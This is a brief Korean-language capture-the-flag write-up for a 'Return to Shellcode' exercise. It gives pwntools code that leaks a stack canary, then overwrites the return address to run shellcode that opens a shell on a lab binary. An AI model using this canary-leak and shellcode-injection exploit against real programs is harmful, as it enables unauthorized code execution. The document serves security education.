# ☘️ Return to Shellcode <br>

## 📄 Exploit <br>
- **checksec** 이용 보호 기법 파악 <br>
```
$ checksec ./r2s
[*] '/home/dreamhack/r2s'    
  Arch:     amd64-64-little    
  RELRO:    Full RELRO
  Stack:    Canary found
  NX:       NX disabled
  PIE:      PIE enabled
  RWX:      Has RWX segments
```

- 스택 프레임 정보 수집 <br>
```python
p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
p.recvuntil(b'$rbp: ')
sfp_buf = int(p.recvline().split()[0])
canary_buf = sfp_buf - 8
```
buf와 sfp의 출력된 주소를 각각 저장 <br>
canary_buf에 카나리 위치 주소 저장 -> rbp 바로 아래 8바이트 <br>

- Canary Leak <br>
```python
payload = b'A' * (canary_buf + 1)
p.sendafter(b'Input: ', payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))
```
buf부터 canary의 첫 byte까지 덮을만큼 payload를 구성, input에 입력 <br>
canary는 8byte로 구성 -> 첫 byte는 '\00' + 뒤의 7byte <br>

- Shellcode 삽입 <br>
```python
sh = asm(shellcraft.sh())
payload = sh + b'A' * (canary_buf - len(sh))
payload += p64(canary) + b'B' * 8 + p64(buf)
p.sendlineafter(b'Input: ', payload)
```
pwntools shellcraft이용 자동으로 쉘코드 작성 <br>





